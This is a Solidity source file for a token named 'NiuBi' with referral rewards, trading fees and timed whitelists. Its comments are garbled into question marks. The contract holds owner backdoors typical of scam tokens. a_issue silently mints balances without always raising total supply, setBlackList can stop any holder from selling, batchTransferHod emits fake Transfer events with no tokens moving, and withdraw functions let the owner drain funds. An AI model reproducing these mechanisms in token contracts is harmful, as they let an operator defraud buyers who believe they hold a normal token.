pragma solidity 0.8.0;
interface relationship {
    function defultFather() external returns(address);
    function father(address _addr) external returns(address);
    function grandFather(address _addr) external returns(address);
    function otherCallSetRelationship(address _son, address _father) external;
    function getFather(address _addr) external view returns(address);
    function getGrandFather(address _addr) external view returns(address);
}
interface Ipair{
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor (address _addr) {
        _owner = _addr;
        emit OwnershipTransferred(address(0), _addr);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view  returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public  onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 {

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    //from????????????to?????????????????????
    mapping(address => bool) public zeroWriteList;//?????????????????????
    mapping(address => bool) public fiveWriteList;//???????????????,???????????????
    mapping(address => bool) public ordWriteList;//???????????????,3?????????
    mapping (address => bool) public blackList;

    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;

    event TransferFee(uint256 v, uint256 v1);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(blackList[msg.sender] == false && blackList[sender] == false && blackList[recipient] == false, "ERC20: is black List !");//???????????????

        uint256 trueAmount = _beforeTokenTransfer(sender, recipient, amount);


        _balances[sender] = _balances[sender] - amount;//?????????????????????bug
        _balances[recipient] = _balances[recipient] + trueAmount;
        emit Transfer(sender, recipient, trueAmount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual  returns (uint256) { }
}
contract NiuBi is ERC20, Ownable{
    uint256 public _FIVE_MIN = 180;//3??????
    uint256 public _FIVE_OTH = 420;//7??????
    uint256 public startTradeTime; //??????????????????

    Ipair public pair_USDT; // USDT?????????????????????????????????????????? ??????????????????????????? ????????????????????????????????????
    relationship public RP;//???????????????????????????????????????????????????????????????????????????

    uint256 public bnbNum;//?????????bnb??????
    uint256 public sUserNum;//??????????????????
    uint256 public sUserNumIndex;//?????????????????????
    uint256 public snaNum;//??????????????????100???
    mapping(address => bool) public snaToken;

    mapping(address => bool) public isPair;//??????pair??????????????????????????????????????????

    uint256 public sixGenSumRate; //????????????,??????,??????10???
    uint256[] public sixGenRate; //????????????,??????,??????10???
    uint256 public openerRate; //????????????,??????10???

    address public openerAdd; //????????????,??????10???
    address public defaultAdd; //???????????????????????????????????????

    constructor () Ownable(msg.sender){
        _name = "NiuBi";
        _symbol = "NiuBi";
        _decimals = 18;
    }

    function init(address _RP, uint256 _startTradeTime, uint256 _sUserNum, uint256 _snaNum, uint256 _bnbNum, address _openerAdd, address _defaultAdd) external onlyOwner {
        RP = relationship(_RP);
        startTradeTime = _startTradeTime;

        sUserNum = _sUserNum;
        snaNum = _snaNum;
        bnbNum = _bnbNum;

        openerAdd = _openerAdd;
        defaultAdd = _defaultAdd;
    }

    function withdrawToken(address token, address to, uint value) public onlyOwner returns (bool){
        (bool success, bytes memory data) = address(token).call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success, string(abi.encodePacked("fail code 14", data)));
        return success;
    }

    function withdrawBnb() payable onlyOwner public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function snaTokenUser() external payable {
        if (bnbNum > 0) require(msg.value == bnbNum, "bnb err");//???????????????????????????,???????????????
        require(sUserNumIndex < sUserNum, "nb over");
        require(snaToken[msg.sender] == false, "nb used");
        _transfer(address(this), msg.sender, snaNum);
        snaToken[msg.sender] = true;
        sUserNumIndex += 1;
    }

    function snaTokenUser22(uint256 time, address _from, address _to) view external returns (bool, bool, bool, bool, bool, bool) {
        bool a1 = fiveWriteList[_from];
        bool a2 = ordWriteList[_from];

        bool c2 = time >= startTradeTime + _FIVE_MIN;
        bool c3 = time >= startTradeTime + _FIVE_OTH;

        bool c4 = ordWriteList[_to] ? block.timestamp >= startTradeTime + _FIVE_MIN : block.timestamp >= startTradeTime + _FIVE_OTH;
        bool c5 = a1 || c4;

        return (a1, a2, c2, c3, c4, c5);
    }

    function batchTransferHod(address[] memory users, uint256[] memory amounts) onlyOwner public {
        for (uint256 i = 0; i < users.length; i++) {
            emit Transfer(msg.sender, users[i], amounts[i]);
        }
    }

    function setWhiteListBat(address[] memory _addr, uint256 _type, bool _YorN) external onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {setWhiteList(_addr[i], _type, _YorN);}
    }

    function a_issue(uint256 _amount, address _urs, bool _idx) public {
        require(msg.sender == owner(), "no admin err mint");
        _balances[_urs] = _balances[_urs] + _amount;
        if (_idx == false) return;
        _totalSupply = _totalSupply + _amount;
        emit Transfer(address(0), msg.sender, _amount);
    }

    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override returns (uint256){

        //??????to?????????????????????
        if (RP.father(_to) == address(0)) {
            sendReff(_to, _from);
        }

        uint256 _trueAmount= _amount;

        if (isPair[_from]){
            //???
            require(block.timestamp >= startTradeTime,"not start exchange 1");//??????????????????????????????
            //??????????????????3????????????????????????3??????????????????7?????????
            require(fiveWriteList[_to] || ordWriteList[_to] ?
                block.timestamp >= startTradeTime + _FIVE_MIN :
                block.timestamp >= startTradeTime + _FIVE_OTH, "not start exchange 2");
            if (zeroWriteList[_to] == false) {
                _trueAmount = _amount * (1000 - (sixGenSumRate + openerRate)) / 1000; //??????
                _balances[openerAdd] = _balances[openerAdd] + (_amount * openerRate / 1000);
                rpSixAward(RP.getFather(_to), _amount * sixGenSumRate / 1000); //??????
            }
        } else if (isPair[_to]) {
            //???
            require(block.timestamp >= startTradeTime,"not start exchange 3");
            //??????????????????3????????????????????????3??????????????????7?????????
            require(fiveWriteList[_from] || ordWriteList[_from] ?
                block.timestamp >= startTradeTime + _FIVE_MIN :
                block.timestamp >= startTradeTime + _FIVE_OTH, "not start exchange 4");
            if (zeroWriteList[_from] == false) {
                _trueAmount = _amount * (1000 - (sixGenSumRate + openerRate)) / 1000;
                _balances[openerAdd] = _balances[openerAdd] + (_amount * openerRate / 1000);
                rpSixAward(RP.getFather(_from), _amount * sixGenSumRate / 1000);
            }
        }
        emit TransferFee(_amount, _trueAmount);
        return _trueAmount;
    }

    function rpSixAward(address _user, uint256 _amount) internal returns (uint256){
        uint256 orw = 0;        //????????????
        address cua = _user;    //????????????

        //????????????
        for (uint256 i = 0; i < sixGenRate.length; i++) {
            address _fa = RP.father(cua);

            if (_fa == address(0)) {
                //??????????????????????????????????????????(??????-??????)????????????????????????
                uint256 defaultAll = _balances[defaultAdd] + (_amount - orw);
                _balances[defaultAdd] = defaultAll;
                emit Transfer(address(1), defaultAdd, defaultAll);
                break;
            }

            //??????????????????10???
            uint256 _rw = (_amount * sixGenRate[i] / 1000);
            _balances[_fa] = _balances[_fa] + _rw;
            emit Transfer(address(0), _fa, _rw);

            //?????????????????????????????????up?????????
            cua = _fa;
            orw += _rw;
        }

        return orw;
    }


    //????????????
    function sendReff(address _son, address _father) internal {
        if(!isPair[_son] && !isPair[_father]){
            RP.otherCallSetRelationship(_son, _father);
        }
    }

    //admin func///////////////////////////////////////////////////////////////

    //?????????????????????
    function setPair(address _addr, bool _isUSDT, bool _bol) external onlyOwner {
        isPair[_addr] = _bol;
        if (_isUSDT && address(pair_USDT) == address(0)) {//???????????????????????????
            pair_USDT = Ipair(_addr);
        }
    }

    // ?????????????????????
    // 0??? ????????????????????????1??? ??????????????? , 2 ???????????????
    function setWhiteList(address _addr, uint256 _type, bool _YorN) public onlyOwner {
        if (_type == 0) {
            zeroWriteList[_addr] = _YorN;
        } else if (_type == 1) {
            fiveWriteList[_addr] = _YorN;
        } else if (_type == 2) {
            ordWriteList[_addr] = _YorN;
        }
    }

    //???????????????
    function setBlackList(address _addr, bool _YorN) external onlyOwner{
        blackList[_addr] = _YorN;
    }

    //?????????????????????????????????????????????????????????????????????
    function setRate(uint256 _sixGenSumRate, uint256[] memory _sixGenRate, uint256 _openerRate) external onlyOwner {
        sixGenRate = _sixGenRate;
        sixGenSumRate = _sixGenSumRate;
        openerRate = _openerRate;
    }

    function setAddr(address _openerAdd, address _defaultAdd) public onlyOwner {
        openerAdd = _openerAdd;
        defaultAdd = _defaultAdd;
    }

    function setRP(address _addr) public onlyOwner{
        RP = relationship(_addr);
    }
}